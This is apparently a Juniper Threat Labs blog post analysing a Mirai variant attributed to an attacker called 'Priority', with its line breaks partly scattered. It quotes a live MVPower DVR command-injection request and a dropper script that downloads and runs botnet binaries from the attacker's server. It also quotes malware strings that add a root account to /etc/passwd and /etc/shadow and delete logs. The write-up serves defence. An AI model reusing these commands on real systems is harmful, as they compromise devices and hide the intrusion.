@@ -1,0 +1,251 @@
+Mirai has become such a common discovery in the wild that it is beginning to be disregarded as white noise, played off as a simple attack that should be readily stopped by common security products.
+
+This is dangerous thinking and will lull security professionals and executives into complacency.
+
+Juniper Threat Labs has discovered a new attack, based off of Mirai from an attacker who originally appeared to be calling themselves “Priority”.
+
+In later versions, this attacker took that out of the code and started deploying a more advanced version of Mirai.
+
+This attacker appears to be amateur, as we will explore more later on.
+
+Note that this could be a ruse to mask a more sophisticated attacker.
+
+The original malware used by the attacker is based off the Demonbot variant of Mirai and focuses on the Hadoop YARN exploit .
+
+The second variant the attacker used is based off the variant of Mirai developed by Scarface.
+
+  While Demonbot focuses on attacking Hadoop, the developer Scarface attempted to make the bot more “user friendly” and focused on Internet of Things devices.
+
+Scarface is known to make his code more readily available to novice actors, but has the reputation of including backdoors in the code to allow him access to victims of others.
+
+While the Scarface variant is considerably more advanced than Demonbot, the attacker is still only attempting the DVR exploit on port 60001.
+
+This Priority attacker has been active from September 10, 2020 up until the publishing of this blog.
+
+They are attacking ports 5500, 5501, 5502, 5050 and 60001 with a simple command of “GET /shell?cd%20/tmp;%20wget%20http://45(.)13.58.4/TPJ.sh;”.
+
+The initial attacks started on port 60001, before progressing into additional ports.
+
+This attack leverages the MVPower DVR Shell Unauthenticated Command Execution , reported by Unit 42 as part of the Omni Botnet variant of Mirai .
+
+What is interesting about this attacker is Juniper Threat Labs has not witnessed them using any additional exploits, perhaps showing again the attackers immaturity in the attack methodology.
+
+In contrast, we see the majority of attackers using Mirai variants running three to seven different vulnerabilities against multiple protocols or devices.
+
+This attacker has limited their attacks to a single exploit and, while spread over a few ports, the primary objective is attacking port 60001.
+
+The other ports appear more like a diversion, leading us to believe that the attacker has a specific objective in mind.
+
+All the attacks originated from an IP address (128(.)199.15.87) owned by Digital Ocean, out of their Santa Clara data center.
+
+Digital Ocean is a well-known VPS provider that allows for quick setup and destruction of Virtual Private Servers.
+
+These servers are a mainstay for hackers to pop-up launch their attacks and then destroy their servers at low cost.
+
+That attacker progressed to a new server at 64(.)227.97.145, a different server also based out of the Digital Ocean Santa Clara data center.
+
+The JAWS DVR software has been under attack with a steady increase since October 2019 and peaking in June 2020.
+
+In the past few months, SANS saw a steady decline in the activity of port 60001.
+
+Meanwhile, we at Juniper Threat Labs have seen a significant increase since July 2020, peaking at 733 daily attacks on the July 18.
+
+Attacks for port 5500, 5501, 5502 and 5050 do not seem to be targeting a specific vulnerability.
+
+The file downloaded was a simple shell script with the following contents.
+
+The IP address of the malware hosting server 45(.)13.58.4 is Heficed, another VPS provider but less well-known than Digital Ocean.
+
+What’s unique about this attack is that the first file variants of dlr.
+
+* (x86, mips, mpls, arm(all) and ppc are all packed with UPX, while m68k, sh4 and spc appear to not be packed at all.
+
+The strings in the files that show this to be a variant of Mirai are: “NeTiS and Thisity” and “FoReHeAd We BiG L33T HaxErS”
+
+Then, in future versions, there appears to be some significant changes specifically in claiming the system for “Priority” Server Infected!
+
+System Now Owned By Priority 54.39.36.160 Proximity-Killers These Mirai variants are identified by Juniper ATP Cloud as Mirai.0 The IP address referenced in the code is (54(.)39.36.160) also hosted at another VPS known as
+
+OVH Hosting Inc.
+
+Open ports on this IP are 21/tcp open ftp 22/tcp open ssh 80/tcp open http 445/tcp filtered microsoft-ds 3306/tcp open mysql 55555/tcp open unknown The web interface displays an Apache 2 Test page for CentOS.
+
+While this attacker does not appear to be as sophisticated as the developers of Mirai and Hoaxcall, they do appear to have a basic understanding of rudimentary attacks and modifying malware code to suit their needs.
+
+They understand the basics of anonymity, but their desire to “identify” themselves and “claim” their territory is reminiscent of hackers of the ‘80s and ‘90s.
+
+The attacker has most recently switched to a new attacking IP of 149(.)3.170.237 with the command originating from both of the IPs used in previous attacks.
+
+GET /shell?cd%20/tmp;%20wget%20http://149(.)3.170.237/Masked.sh;%20chmod%20777%20*;%20sh%20Masked.sh;%20rm%20-rf%20*;%20history%20-c
+
+HTTP/1.1 The contents of the new shell script point to the same server located on Seychelles Island in the Indian Ocean.
+
+#!/bin
+
+/bash cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.mips;
+
+chmod +x Masked.mips; ./Masked.mips; rm -rf Masked.mips cd /tmp || cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.mpsl;
+
+chmod +x Masked.mpsl; ./Masked.mpsl; rm -rf Masked.mpsl cd /tmp || cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.sh4; chmod +x Masked.sh4; ./Masked.sh4; rm -rf Masked.sh4 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.x86; chmod +x Masked.x86; ./Masked.x86; rm -rf Masked.x86 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.arm6; chmod +x Masked.arm6; ./Masked.arm6; rm -rf Masked.arm6 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.i686; chmod +x Masked.i686; ./Masked.i686; rm -rf Masked.i686 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.ppc; chmod +x Masked.ppc; ./Masked.ppc; rm -rf Masked.ppc cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.i586; chmod +x Masked.i586; ./Masked.i586; rm -rf Masked.i586 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.m68k; chmod +x Masked.m68k; ./Masked.m68k; rm -rf Masked.m68k cd /tmp || cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.sparc; chmod +x Masked.sparc; ./Masked.sparc; rm -rf Masked.sparc cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.arm4; chmod +x Masked.arm4; ./Masked.arm4; rm -rf Masked.arm4 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.arm5; chmod +x Masked.arm5; ./Masked.arm5; rm -rf Masked.arm5 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.arm7; chmod +x Masked.arm7; ./Masked.arm7; rm -rf Masked.arm7 cd /tmp
+
+|| cd /var/run || cd /mnt
+
+|| cd /root || cd /; wget http:// 149 (.)
+
+3 .
+
+170 .
+
+237 /Masked.ppc440fp; chmod +x Masked.ppc440fp; ./Masked.ppc440fp; rm -rf Masked.ppc440fp
+
+The following strings taken from the second wave of this attacker indicate this source code was taken from the Yakuza/Scarface variant of Mirai.
+
+(null)
+
+Billy BobBot/1.0 (+http://www. billy bobbot.com/crawler/)
+
+YakuzaBotnet Scarface1337 In the strings we can see that attacker inserting a user into /etc/passwd and /etc/shadow wwget -q –delete-after http://nexon-nx.ga/iplogger/?id 443011503 eecho system:x:0:500::/:/bin/bash >> /etc
+
+/passwd eecho system:’$6$ZPptHtmp$q9o5eFjUAh.
+
+MPmnHJbkuSNggDaq.
+
+A00dRgOBAW6gh7Uv7i/dOYD04.xMHQHtyhnkcMiYCrI6aB9KC4Lv.d3rx/:16601:0:99999:7:::’ >> /etc
+
+/shadow rrm -rf /var/log/* &> /dev/null Juniper’s ATP Cloud identifies it as Mirai variant [Trojan.
+
+Mirai.6981169].
+
+As we continue to see more and more distribution of malware code, we will see a wider spread of attackers with limited skill using exploits and code bases that they would normally not have the capabilities of developing.
+
+These attackers are able to use search engines and browse Github to obtain the source code and research how to make simple modifications and obfuscate their malware to appear more adept.
+
+Information Security professionals will continue to see Mirai for the foreseeable future and should not discount any “attacks” as trivial.
+
+
+
+
